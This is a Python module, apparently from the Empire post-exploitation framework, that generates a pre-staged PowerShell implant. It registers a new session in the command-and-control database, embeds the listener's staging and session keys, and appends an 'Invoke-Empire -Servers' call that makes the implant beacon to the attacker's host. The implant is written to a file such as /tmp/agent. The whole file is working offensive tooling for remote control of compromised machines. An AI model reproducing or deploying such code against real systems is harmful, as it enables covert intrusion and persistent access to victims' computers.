from __future__ import print_function
from builtins import object
import os
import string
from pydispatch import dispatcher
from lib.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Generate Agent',

            'Author': ['@harmj0y'],

            'Description': ("Generates an agent code instance for a specified listener, "
                            "pre-staged, and register the agent in the database. This allows "
                            "the agent to begin beconing behavior immediately."),

            'Background': True,

            'OutputExtension': None,

            'NeedsAdmin': False,

            'OpsecSafe': True,

            'Language': 'Python',

            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate the agent for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language to generate for the agent.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'OutFile' : {
                'Description'   :   'Output file to write the agent code to.',
                'Required'      :   True,
                'Value'         :   '/tmp/agent'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def execute(self):

        listenerName = self.options['Listener']['Value']
        language = self.options['Language']['Value']
        outFile = self.options['OutFile']['Value']

        if listenerName not in self.mainMenu.listeners.activeListeners:
            print(helpers.color("[!] Error: %s not an active listener"))
            return None

        activeListener = self.mainMenu.listeners.activeListeners[listenerName]

        chars = string.uppercase + string.digits
        sessionID = helpers.random_string(length=8, charset=chars)

        stagingKey = activeListener['options']['StagingKey']['Value']
        delay = activeListener['options']['DefaultDelay']['Value']
        jitter = activeListener['options']['DefaultJitter']['Value']
        profile = activeListener['options']['DefaultProfile']['Value']
        killDate = activeListener['options']['KillDate']['Value']
        workingHours = activeListener['options']['WorkingHours']['Value']
        lostLimit = activeListener['options']['DefaultLostLimit']['Value']
        if 'Host' in activeListener['options']:
            host = activeListener['options']['Host']['Value']
        else:
            host = ''

        # add the agent
        self.mainMenu.agents.add_agent(sessionID, '0.0.0.0', delay, jitter, profile, killDate, workingHours, lostLimit, listener=listenerName, language=language)

        # get the agent's session key
        sessionKey = self.mainMenu.agents.get_agent_session_key_db(sessionID)

        agentCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_agent(activeListener['options'], language=language)

        if language.lower() == 'powershell':
            agentCode += "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';" % (host, stagingKey, sessionKey, sessionID)
        else:
            print(helpers.color('[!] Only PowerShell agent generation is supported at this time.'))
            return ''

        # TODO: python agent generation - need to patch in crypto functions from the stager...

        print(helpers.color("[+] Pre-generated agent '%s' now registered." % (sessionID)))

        # increment the supplied file name appropriately if it already exists
        i = 1
        outFileOrig = outFile
        while os.path.exists(outFile):
            parts = outFileOrig.split('.')
            if len(parts) == 1:
                base = outFileOrig
                ext = None
            else:
                base = '.'.join(parts[0:-1])
                ext = parts[-1]

            if ext:
                outFile = "%s%s.%s" % (base, i, ext)
            else:
                outFile = "%s%s" % (base, i)
            i += 1

        f = open(outFile, 'w')
        f.write(agentCode)
        f.close()

        print(helpers.color("[*] %s agent code for listener %s with sessionID '%s' written out to %s" % (language, listenerName, sessionID, outFile)))
        print(helpers.color("[*] Run sysinfo command after agent starts checking in!"))
